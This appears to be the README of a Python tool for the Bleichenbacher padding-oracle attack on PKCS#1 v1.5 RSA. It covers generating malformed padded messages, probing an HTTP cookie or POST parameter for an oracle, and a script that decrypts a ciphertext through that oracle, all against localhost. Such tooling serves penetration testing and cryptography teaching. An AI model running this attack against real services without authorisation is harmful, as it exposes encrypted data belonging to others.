pybleach
========

A library to facilitate the detection and exploitation of padding oracle attacks, more specifically attacks on PKCS1_v1.5. It implements the [Bleichenbacher](http://archiv.infsec.ethz.ch/education/fs08/secsem/Bleichenbacher98.pdf) attack to decrypt any ciphertext given a padding oracle.

## Generation of faulty padding

**pkcs1_test_client** is a client to generate faulty PKCS1 padded messages. Provide it an input message, and it will output a set of incorrectly padded messages. The 5 test cases implemented are:

```
➜  pyorapad git:(master) ./pkcs1_test_client.py -h | grep -i "padding test" -A 100
Padding Test:
  The padding tests to run (multiple choice possible). Each message will be
  output on a seperate line

  -1, --cm              Generate a valid PKCS1 v1.5 padded message
  -2, --cnb             Generate a valid PKCS1 v1.5 padded message which
                        contains multiple conecutive null-bytes
  -3, --nch             Generate a non-conforming PKCS1 v1.5 padded message.
                        Message will start with 0x0001, expected 0x0002
  -4, --ncl             Generate a non-conforming PKCS1 v1.5 padded message.
                        Message will contain a null-byte within the 8 bytes of
                        random padding
  -5, --ncd             Generate a non-conforming PKCS1 v1.5 padded message.
                        Message will not contain a null-byte delimiter
  -a, --all             Generate all test cases
```

For example, to generate all __-a__ cleartext __-c__ PKCS1 faulty messages for the __"ZZZZ"__ cleartext using the __256.pub__ public key, you can do the following:
```
➜  pyorapad git:(master) ./pkcs1_test_client.py -f keypairs/256.pub ZZZZ -a -c
0002ed31112d2834d547b288b1f8097ae4d3296f78a8b32be1b341005a5a5a5a
000277194205eafd22d4032d808ff0b2a950c614fa88fed3b20000005a5a5a5a
0001b4a1f7ea78ca60c9231703427a42491da04c861cf7e4ac6e75005a5a5a5a
00027f7e9b0033a684f92c50b43353d5f33f67a0a8938fce462ca2005a5a5a5a
0002cb998dc3a018b750d0319737afa00fbe14067ebcfac70fc0e7ff5a5a5a5a
```

To get the same output encrypted with the public key, just remove the __-c__ flag:
```
➜  pyorapad git:(master) ./pkcs1_test_client.py -f keypairs/256.pub ZZZZ -a   
0fc02a684419f82c12d83dd73c92182696afda77c69ac7c2c74fc6f16dfa6b15
69e944e68fdd6b4f52d8cd35dca43a53d19932813349595622e38c4a680f853a
8a4c71bb14ca822fdbc080cb3248285f0e1f7e5c7c54019bf08f0038e1de9b10
8d308248c7dc5bd57c7406f7d58e3814945a03a746cbb0525b5edcabfe62eda3
9101b24a425fe5d9f36ebd7c2c3243a9ab47a8c24fb73690a5daea0d6b12cb59
```

## Testing faulty padding

A very simple http client is provided to test a particular URL, POST parameter or header for PKCS1 padding oracle vulnerabilities. To do so, generate padding faults using the client above, and send the result to the **http_client**. The **http_client** will provide:
* The resulting status code
* The time it took for the request to complete
* (optional) The resulting request

For example, to send 5 times **-i** some a correctly padded output in the COOKIE header **-x** to the url **-u** you can do the following:
```
➜  pyorapad git:(master) ✗ ./pkcs1_test_client.py -f keypairs/256.pub abcd | ./http_client.py -u 'http://127.0.0.1:8000' -x Cookie="%s" -i 5
ae8dda9d89d27f8b1bd18565b6a09aabfa567b9db60fb2a1b788a959e278c811
	Code:      200	Duration:  0.006587
	Code:      200	Duration:  0.001053
	Code:      200	Duration:  0.000977
	Code:      200	Duration:  0.000994
	Code:      200	Duration:  0.000967
```

To test all **-a** faulty padding test cases of the POST **-p** parameter through a proxy (useful for debugging or further modifications using your favourite proxy), you can do the following:
```
➜  pyorapad git:(master) ✗ ./pkcs1_test_client.py -f keypairs/256.pub abcd -a | http_proxy="http://127.0.0.1:8080" ./http_client.py -u 'http://127.0.0.1:8000' -p param="%s" -i 1
58f3cc08f2de432e44b81d32f7639bcec89cd07752116615f17635dc0870d89c
	Code:      403	Duration:  0.035813
82195dad39e5be85c4959c3c5dfefc85c0e11582d5c42c5b61eb49faf0b2c59e
	Code:      403	Duration:  0.049567
382cdff02984da708f9332b48a64b64542b466c00b4386cff7595f0d0b1db2e3
	Code:      403	Duration:  0.048423
1a86ddd8a1c05351eb7c1c5f2c31fd2f55f3f03d9af86cfa0e6546fa553cec97
	Code:      403	Duration:  0.048562
4934721447b2ace0a30adb163313ec87d36c59a3cfdac6d3b258a90fff6a55dd
	Code:      500	Duration:  0.088740
```
The latest request is suspicious, since it returns a different error code and timing for an faulty message. You have found an injection point!

## Oracle, decrypt me that cleartext!

A bit of work is needed here, namely writting a similar script:

```python
import logging
from oracle import HttpOracle
from padding import Bleichenbacher

if __name__ == "__main__":
  logging.basicConfig(level=logging.DEBUG)
  try:
    def callback(resp, duration):
      ret = False
      if resp != None:
        #print(resp.getcode(), dict(resp.info()), resp.read())
        if resp.getcode() == 500:
          ret = True
      else:
        print("Request failed")
      return ret
    o = HttpOracle("http://127.0.0.1", headers={"Cookie":"name=%0128x"})
    o.set_proxy()
    b = Bleichenbacher.pubkey_from_file("512.pub", o, callback)
    m, i = b.run_search("49affbbe68d923e9cd1d2420fec72aea432b5a119df51f1bba89aa1245eeb627d6809eeebb02db75746df85435735e6e6d11067d77c66da23b7722051141bb19")
    print("Found cleartext :%i in %i iterations" % (m, i))
  except KeyboardInterrupt:
    b.stop_search()
```

Once this has run for a long time, you should get the cleartext message you are looking for
